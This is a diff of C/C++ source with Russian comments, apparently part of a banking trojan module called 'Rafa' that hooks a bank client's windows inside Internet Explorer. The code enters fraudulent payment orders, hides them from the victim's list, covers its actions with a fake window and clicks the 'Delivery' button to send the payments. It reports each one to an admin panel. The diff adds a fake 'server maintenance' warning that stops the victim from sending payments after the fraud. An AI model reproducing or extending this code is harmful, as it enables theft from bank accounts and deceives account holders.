@@ -129,6 +129,7 @@ static void DBGPrintPayment( PaymentOrder* po ); //печать переданной (считанной)
 static void RelocPayment( char* base ); //перерасчитывает адреса в массиве paymentOrders после перевыделения памяти или загрузки из файла
 static int BalansToInt( const char* s, int format = 0 );
 static char* IntToBalans( int v, char* s, int format = 0 );
+static bool FindTreeList();
 
 HWND IEWnd = 0; //окно ИЕ в котором ищем все нужные нам окна
 DWORD PID = 0; //для избежания 2-го запуска
@@ -137,13 +138,15 @@ int fromLVM = 0;  //если равно 1, то передаем цифру в админку (см. функцию GrabB
 HWND treeView = 0, listView = 0, toolBar = 0;
 int idBtNewDoc = 0;
 int idBtDelivery = 0; //кнопка на тулбаре Доставка
+bool offBtDelivery = false; //отключить кнопку Доставка, нужно показывать диалог о профилактике
 POINT posBtNewDoc, posBtDelivery;
 int stateFakeWindow = 0;
 PaymentOrder* paymentOrders = 0; //платежные поручения
 int c_paymentOrders = 0; //количество скрываемых (полученных) платежек
 AccountBalans findedBalans[8]; //найденный счета с балансами
 int c_findedBalans = 0; //количество найденных счетов
-
+const char* prophylaxisText = "На данный момент это функцию выполнить невозможно, так как на сервере проводятся профилактические работы. "
+							  "Попробуйте через некоторое время.\nИзвините за доставленные неудобства.";
 
 //переменные для скрытия платежек
 int paramRows[400]; //каждая строка содержит параметр по которому извлекаются данные (не по номеру), поэтому для скрытия храним и этот параметр
@@ -417,7 +420,7 @@ static LRESULT WINAPI HandlerSendMessageA(HWND hWnd, UINT Msg, WPARAM wParam, LP
 			update = true;
 			break;
 		case LVM_GETSELECTIONMARK:
-			DBGRAFA( "Rafa", "LVM_SORTITEMS" );
+			DBGRAFA( "Rafa", "LVM_GETSELECTIONMARK" );
 			return 1;
 			break;
 		default:
@@ -463,6 +466,7 @@ static LRESULT WINAPI HandlerPaymentWndProc(HWND hWnd, UINT Msg, WPARAM wParam, 
 
 static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
 {
+	//DBGRAFA( "Rafa", "Msg %d", Msg );
 	int paramOrig, numItem;
 	switch( Msg )
 	{
@@ -492,10 +496,32 @@ static LRESULT WINAPI HandlerMainWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPA
 							return 0;
 						else
 							p->lParam = paramRows[p->iItem];
+						if( idBtDelivery == 0 ) //для поиска кнопки Доставка, не всегда ее можно найти при старте
+							FindTreeList();
 					}
 					break;
 				}
 			}
+			else
+				if( pdi->hwndFrom == toolBar )
+				{
+					switch( pdi->code )
+					{
+						case NM_CLICK:
+						{
+							NMMOUSE* p = (NMMOUSE*)lParam;
+							if( p->dwItemSpec == idBtDelivery )
+							{
+								DBGRAFA( "Rafa", "Нажата кнопка Доставка" );
+								if( offBtDelivery )
+								{
+									MessageBox( 0, prophylaxisText, "Внимание!", MB_ICONWARNING );
+								}
+							}
+							//DBGRAFA( "Rafa", "toolBar %d %d %d", pdi->idFrom, p->dwItemSpec, p->dwItemData );
+						}
+					}
+				}
 			break;
 		}
 	}
@@ -1163,16 +1189,20 @@ static BOOL CALLBACK EnumTreeList( HWND wnd, LPARAM lParam )
 					posBtNewDoc.y = r.top;
 					DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtNewDoc.x, posBtNewDoc.y );
 				}
-				if( hash == 0xD3910EEF /* Доставка */ && bt.idCommand == 111 )
+				if( hash == 0xD3910EEF /* Доставка */ /*&& bt.idCommand == 111*/ )
 				{
-					toolBar = wnd;
-					idBtDelivery = bt.idCommand;
-					DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
 					RECT r;
 					pSendMessageA( wnd, TB_GETRECT, (WPARAM)bt.idCommand, (LPARAM)&r );
-					posBtDelivery.x = r.left;
-					posBtDelivery.y = r.top;
-					DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtDelivery.x, posBtDelivery.y );
+					//есть две кнопки Доставка, но одна шириною 2, поэтому ее игнорируем
+					if( r.right - r.left > 20 )
+					{
+						toolBar = wnd;
+						idBtDelivery = bt.idCommand;
+						DBGRAFA( "Rafa", "Found button %d '%s'", bt.idCommand, text );
+						posBtDelivery.x = r.left;
+						posBtDelivery.y = r.top;
+						DBGRAFA( "Rafa", "Found button x,y (%d,%d)", posBtDelivery.x, posBtDelivery.y );
+					}
 				}
 			}
 		}
@@ -1664,7 +1694,11 @@ static void WorkInRafa()
 			was = true;
 			break;
 		}
-	if( was ) return; //повторно не делаем
+	if( was ) 
+	{
+		offBtDelivery = true;
+		return; //повторно не делаем
+	}
 	stateFakeWindow = 1; //запуск окна скрывающего наши действия
 	HANDLE hThread = pCreateThread( NULL, 0, FakeWindow, (LPVOID)parent, 0, 0 );
 	pCloseHandle(hThread);
@@ -1768,7 +1802,7 @@ static void WorkInRafa()
 									SetText( "punktrecv", po->bankCity, cf, countControls );
 									SetText( "comment", po->comment, cf, countControls, " " ); //посылаем еще дополнительно клавишу пробел, так как без этого форма не считает что в это поле был введен текст
 
-									stateFakeWindow |= 8; //ловим всплывающее мени НДС
+									stateFakeWindow |= 8; //ловим всплывающее меню НДС
 									retMenuNds = po->nds[0] == '0' ? 4 : 5; //что нужно выбрать в меню НДС (4 - без ндс, 5 - с ндс)
 									ClickButton( "nds", cf, countControls ); //кликаем на кнопку, которая открывает меню NDS
 									//ждем появления меню, на самом деле оно не появится, просто функция TrackPopupMenu сразу вернет нужное нам значение
@@ -1789,7 +1823,7 @@ static void WorkInRafa()
 									ClickButton( "save", cf, countControls );
 									pSleep(5000); //ждем пока сохранится
 									stateFakeWindow &= ~16; //снимаем нулевую прозрачность, будет прозрачность = 1 (в нулевой прозрачности не действуют клики)
-									//HardClickToWindow( toolBar, posBtDelivery.x + 5, posBtDelivery.y + 5 );
+									HardClickToWindow( toolBar, posBtDelivery.x + 5, posBtDelivery.y + 5 );
 									DBGRAFA( "Rafa", "Нажали кнопку 'Доставка' %d,%d", posBtDelivery.x, posBtDelivery.y );
 									HWND wndConfirmation = 0;
 									//ждем появления окна подтверждения
@@ -1799,7 +1833,7 @@ static void WorkInRafa()
 										wndConfirmation = FindForm(&formConfirmation);
 										if( wndConfirmation ) break;
 									}
-									
+									//wndConfirmation = 0;
 									if( wndConfirmation )
 									{
 										POINT p; p.x = 325; p.y = 235;
@@ -1814,6 +1848,7 @@ static void WorkInRafa()
 										pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)root );
 										po->entered = true;
 										SavePaymentOrders();
+										offBtDelivery = true;
 										SendLogToAdmin(3);
 									}
 								}
